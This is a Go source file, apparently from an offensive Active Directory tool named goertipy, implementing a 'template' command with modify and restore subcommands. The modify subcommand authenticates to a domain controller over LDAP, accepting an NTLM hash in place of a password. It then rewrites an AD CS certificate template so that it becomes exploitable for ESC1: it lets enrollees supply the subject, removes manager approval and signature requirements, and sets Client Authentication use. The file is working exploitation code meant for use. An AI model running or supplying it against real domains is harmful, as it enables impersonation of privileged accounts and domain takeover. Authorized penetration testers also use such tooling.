package commands

import (
	"fmt"
	"os"

	"github.com/slacker/goertipy/pkg/adcs"
	goertipyldap "github.com/slacker/goertipy/pkg/ldap"
	goertipylog "github.com/slacker/goertipy/pkg/log"
	"github.com/spf13/cobra"
	"golang.org/x/term"
)

// TemplateFlags holds the flags for the template command
type TemplateFlags struct {
	// Authentication
	Username string
	Password string
	Hashes   string

	// Target
	Domain string
	DCIP   string
	Scheme string

	// Template
	TemplateName string
	BackupFile   string

	// Verbosity
	Debug   bool
	Verbose bool
}

var templateFlags TemplateFlags

// NewTemplateCommand creates the template command with modify/restore subcommands
func NewTemplateCommand() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "template",
		Short: "Modify or restore AD CS certificate templates (ESC4)",
		Long: `Modify certificate templates to exploit ESC4 vulnerabilities.

Use 'template modify' to make a template ESC1-exploitable by changing its
attributes, and 'template restore' to revert the changes from a backup file.`,
	}

	cmd.AddCommand(newTemplateModifyCommand())
	cmd.AddCommand(newTemplateRestoreCommand())

	return cmd
}

func addTemplateFlags(cmd *cobra.Command) {
	cmd.Flags().StringVarP(&templateFlags.Username, "username", "u", "", "Username (user@domain or DOMAIN\\user)")
	cmd.Flags().StringVarP(&templateFlags.Password, "password", "p", "", "Password")
	cmd.Flags().StringVarP(&templateFlags.Hashes, "hashes", "H", "", "NTLM hash (LM:NT or :NT)")
	cmd.Flags().StringVarP(&templateFlags.Domain, "domain", "d", "", "Target domain")
	cmd.Flags().StringVar(&templateFlags.DCIP, "dc-ip", "", "Domain Controller IP address")
	cmd.Flags().StringVar(&templateFlags.Scheme, "scheme", "ldaps", "LDAP scheme (ldap or ldaps)")
	cmd.Flags().BoolVar(&templateFlags.Debug, "debug", false, "Enable debug output")
	cmd.Flags().BoolVarP(&templateFlags.Verbose, "verbose", "v", false, "Enable verbose output")
}

func newTemplateModifyCommand() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "modify",
		Short: "Modify a template to be ESC1-exploitable",
		Long: `Modify a certificate template's attributes to make it vulnerable to ESC1.

Changes made:
  - msPKI-Certificate-Name-Flag: Add ENROLLEE_SUPPLIES_SUBJECT
  - msPKI-Enrollment-Flag: Clear PEND_ALL_REQUESTS (manager approval)
  - msPKI-RA-Signature: Set to 0 (no authorized signatures)
  - pKIExtendedKeyUsage: Set to Client Authentication

A JSON backup file is created automatically before any changes are made.`,
		RunE: runTemplateModify,
	}

	addTemplateFlags(cmd)
	cmd.Flags().StringVar(&templateFlags.TemplateName, "template", "", "Template name to modify (required)")
	cmd.Flags().StringVar(&templateFlags.BackupFile, "backup", "", "Backup file path (default: {template}_backup.json)")

	return cmd
}

func newTemplateRestoreCommand() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "restore",
		Short: "Restore a template from a backup file",
		Long:  `Restore a certificate template to its original configuration using a previously created JSON backup file.`,
		RunE:  runTemplateRestore,
	}

	addTemplateFlags(cmd)
	cmd.Flags().StringVar(&templateFlags.BackupFile, "backup", "", "Backup file path (required)")

	return cmd
}

func connectForTemplate(log *goertipylog.Logger) (*goertipyldap.Client, error) {
	if templateFlags.Username == "" {
		return nil, fmt.Errorf("username is required (-u/--username)")
	}
	if templateFlags.DCIP == "" {
		return nil, fmt.Errorf("DC IP is required (--dc-ip)")
	}

	// Prompt for password if not provided
	if templateFlags.Password == "" && templateFlags.Hashes == "" {
		fmt.Print("Password: ")
		passwordBytes, err := term.ReadPassword(int(os.Stdin.Fd()))
		fmt.Println()
		if err != nil {
			return nil, fmt.Errorf("failed to read password: %w", err)
		}
		templateFlags.Password = string(passwordBytes)
	}

	var ntHash string
	if templateFlags.Hashes != "" {
		_, nt, err := goertipyldap.ParseHashes(templateFlags.Hashes)
		if err != nil {
			return nil, fmt.Errorf("invalid hashes: %w", err)
		}
		ntHash = nt
		log.Info("Using NTLM hash authentication")
	}

	port := 636
	useTLS := true
	if templateFlags.Scheme == "ldap" {
		port = 389
		useTLS = false
	}

	log.Info("Connecting to %s:%d (TLS: %v)", templateFlags.DCIP, port, useTLS)

	client, err := goertipyldap.Connect(goertipyldap.Options{
		Server:             templateFlags.DCIP,
		Port:               port,
		UseTLS:             useTLS,
		Username:           templateFlags.Username,
		Password:           templateFlags.Password,
		NTHash:             ntHash,
		Domain:             templateFlags.Domain,
		InsecureSkipVerify: true,
	})
	if err != nil {
		return nil, fmt.Errorf("failed to connect: %w", err)
	}

	log.Info("Connected successfully")
	return client, nil
}

func runTemplateModify(cmd *cobra.Command, args []string) error {
	log := goertipylog.New(goertipylog.LevelError, os.Stderr)
	if templateFlags.Verbose {
		log.SetLevel(goertipylog.LevelInfo)
	}
	if templateFlags.Debug {
		log.SetLevel(goertipylog.LevelDebug)
	}

	if templateFlags.TemplateName == "" {
		return fmt.Errorf("template name is required (--template)")
	}

	// Connect
	client, err := connectForTemplate(log)
	if err != nil {
		return err
	}
	defer client.Close()

	// Fetch template
	fmt.Printf("[*] Fetching template: %s\n", templateFlags.TemplateName)
	tmpl, err := adcs.GetTemplateByName(client, templateFlags.TemplateName)
	if err != nil {
		return err
	}
	fmt.Printf("[+] Found template: %s (DN: %s)\n", tmpl.Name, tmpl.DN)

	// Save backup
	backupPath := templateFlags.BackupFile
	if backupPath == "" {
		backupPath = tmpl.Name + "_backup.json"
	}

	fmt.Printf("[*] Saving backup to: %s\n", backupPath)
	if err := adcs.SaveTemplateConfig(tmpl, backupPath); err != nil {
		return fmt.Errorf("failed to save backup: %w", err)
	}
	fmt.Printf("[+] Backup saved successfully\n")

	// Show current state
	fmt.Println()
	fmt.Println("[*] Current template configuration:")
	fmt.Printf("    msPKI-Certificate-Name-Flag: %d\n", tmpl.CertificateNameFlag)
	fmt.Printf("    msPKI-Enrollment-Flag: %d\n", tmpl.EnrollmentFlag)
	fmt.Printf("    msPKI-RA-Signature: %d\n", tmpl.RASignature)
	fmt.Printf("    pKIExtendedKeyUsage: %v\n", tmpl.ExtendedKeyUsage)
	fmt.Printf("    Enrollee Supplies Subject: %v\n", tmpl.EnrolleeSuppliesSubject)
	fmt.Printf("    Manager Approval Required: %v\n", tmpl.RequiresManagerApproval)
	fmt.Println()

	// Modify
	fmt.Println("[*] Modifying template for ESC1 exploitation...")
	if err := adcs.ModifyTemplateForESC1(client, tmpl); err != nil {
		return err
	}

	fmt.Println("[+] Template modified successfully!")
	fmt.Println()
	fmt.Println("[*] New configuration:")
	fmt.Println("    msPKI-Certificate-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT enabled")
	fmt.Println("    msPKI-Enrollment-Flag: PEND_ALL_REQUESTS cleared")
	fmt.Println("    msPKI-RA-Signature: 0")
	fmt.Println("    pKIExtendedKeyUsage: Client Authentication")
	fmt.Println()
	fmt.Printf("[!] Template %q is now ESC1-exploitable. Request a certificate, then restore:\n", tmpl.Name)
	fmt.Printf("    goertipy template restore --backup %s ...\n", backupPath)

	return nil
}

func runTemplateRestore(cmd *cobra.Command, args []string) error {
	log := goertipylog.New(goertipylog.LevelError, os.Stderr)
	if templateFlags.Verbose {
		log.SetLevel(goertipylog.LevelInfo)
	}
	if templateFlags.Debug {
		log.SetLevel(goertipylog.LevelDebug)
	}

	if templateFlags.BackupFile == "" {
		return fmt.Errorf("backup file is required (--backup)")
	}

	// Load backup
	fmt.Printf("[*] Loading backup: %s\n", templateFlags.BackupFile)
	config, err := adcs.LoadTemplateConfig(templateFlags.BackupFile)
	if err != nil {
		return err
	}
	fmt.Printf("[+] Loaded backup for template: %s (saved %s)\n", config.TemplateName, config.Timestamp)

	// Connect
	client, err := connectForTemplate(log)
	if err != nil {
		return err
	}
	defer client.Close()

	// Restore
	fmt.Printf("[*] Restoring template: %s\n", config.TemplateName)
	if err := adcs.RestoreTemplate(client, config); err != nil {
		return err
	}

	fmt.Println("[+] Template restored successfully!")
	fmt.Printf("[*] Original configuration applied to: %s\n", config.DN)

	return nil
}
